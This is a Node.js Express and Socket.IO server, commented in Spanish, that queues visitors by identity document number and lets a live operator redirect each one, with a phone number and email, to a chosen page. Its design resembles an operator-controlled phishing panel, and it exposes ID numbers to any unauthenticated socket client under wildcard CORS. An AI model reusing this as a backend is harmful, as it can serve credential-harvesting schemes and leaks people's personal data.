const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');

const app = express();
const server = http.createServer(app);

const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

app.use(cors());
app.use(express.json());

const sessions = new Map();

app.post('/api/session', (req, res) => {
  const { documentType, documentNumber, sessionId } = req.body;
  
  console.log(`📱 Nueva solicitud de sesión: ${sessionId} - ${documentNumber}`);
  
  // Verificar si ya existe una sesión con el mismo número de documento que esté esperando
  const existingWaitingSession = Array.from(sessions.values()).find(s => 
    s.documentNumber === documentNumber && s.status === 'waiting'
  );

  if (existingWaitingSession) {
    console.log(`🔄 Reemplazando sesión existente: ${existingWaitingSession.sessionId}`);
    sessions.delete(existingWaitingSession.sessionId);
  }

  const sessionData = {
    sessionId,
    documentType,
    documentNumber,
    documentTypeText: getDocumentTypeText(documentType),
    timestamp: Date.now(),
    status: 'waiting',
    redirectTo: null,
    phoneNumber: null,
    emailAddress: null,
    completedAt: null
  };
  
  sessions.set(sessionId, sessionData);
  
  // Obtener TODAS las sesiones en espera
  const waitingSessions = Array.from(sessions.values()).filter(s => s.status === 'waiting');
  
  console.log(`✅ Sesión registrada: ${sessionId}`);
  console.log(`👥 Total de sesiones en espera: ${waitingSessions.length}`);
  
  // Emitir a TODOS los clientes conectados (admins)
  io.emit('sessions_list', waitingSessions);
  io.emit('new_session', sessionData);
  
  res.json({ success: true, sessionId });
});

app.get('/api/session/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  
  if (sessions.has(sessionId)) {
    res.json({ success: true, session: sessions.get(sessionId) });
  } else {
    res.status(404).json({ success: false, error: 'Session not found' });
  }
});

app.post('/api/session/:sessionId/redirect', (req, res) => {
  const { sessionId } = req.params;
  const { redirectTo, phoneNumber, emailAddress } = req.body;
  
  if (sessions.has(sessionId)) {
    const session = sessions.get(sessionId);
    session.status = 'completed';
    session.redirectTo = redirectTo;
    session.phoneNumber = phoneNumber;
    session.emailAddress = emailAddress;
    session.completedAt = Date.now();
    
    // Emitir actualización a todos los admins
    io.emit('session_updated', session);
    
    // Obtener sesiones en espera actualizadas
    const waitingSessions = Array.from(sessions.values()).filter(s => s.status === 'waiting');
    io.emit('sessions_list', waitingSessions);
    
    // Redirigir al usuario específico
    io.to(sessionId).emit('redirect', { redirectTo, phoneNumber, emailAddress });
    
    console.log(`🔄 Sesión ${sessionId} redirigida a: ${redirectTo}`);
    res.json({ success: true });
  } else {
    res.status(404).json({ success: false, error: 'Session not found' });
  }
});

// Endpoint para obtener todas las sesiones activas
app.get('/api/sessions/active', (req, res) => {
  const activeSessions = Array.from(sessions.values()).filter(s => s.status === 'waiting');
  res.json({ success: true, sessions: activeSessions });
});

io.on('connection', (socket) => {
  console.log('🔌 Nueva conexión Socket.IO:', socket.id);
  
  socket.on('admin_connect', () => {
    const waitingSessions = Array.from(sessions.values()).filter(s => s.status === 'waiting');
    socket.emit('sessions_list', waitingSessions);
    console.log('👨‍💼 Admin conectado, sesiones enviadas:', waitingSessions.length);
  });
  
  socket.on('user_connect', (sessionId) => {
    socket.join(sessionId);
    console.log('👤 Usuario conectado para sesión:', sessionId);
    
    // Enviar sesión actualizada al admin si existe
    if (sessions.has(sessionId)) {
      const session = sessions.get(sessionId);
      if (session.status === 'waiting') {
        const waitingSessions = Array.from(sessions.values()).filter(s => s.status === 'waiting');
        io.emit('sessions_list', waitingSessions);
      }
    }
  });
  
  socket.on('disconnect', (reason) => {
    console.log('❌ Cliente desconectado:', socket.id, 'Razón:', reason);
  });
});

function getDocumentTypeText(type) {
  const types = {
    'ci': 'Cédula de Ciudadanía',
    'ce': 'Cédula de Extranjería', 
    'pp': 'Pasaporte'
  };
  return types[type] || 'Documento';
}

// Limpieza periódica de sesiones completadas antiguas (más de 1 hora)
setInterval(() => {
  const now = Date.now();
  let cleanedCount = 0;
  
  sessions.forEach((session, sessionId) => {
    if (session.status === 'completed' && session.completedAt && (now - session.completedAt) > 3600000) {
      sessions.delete(sessionId);
      cleanedCount++;
    }
  });
  
  if (cleanedCount > 0) {
    console.log(`🧹 Sesiones limpiadas: ${cleanedCount}`);
  }
}, 300000); // Cada 5 minutos

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Servidor backend ejecutándose en puerto ${PORT}`);
  console.log(`📡 WebSockets activos para comunicación en tiempo real`);
});
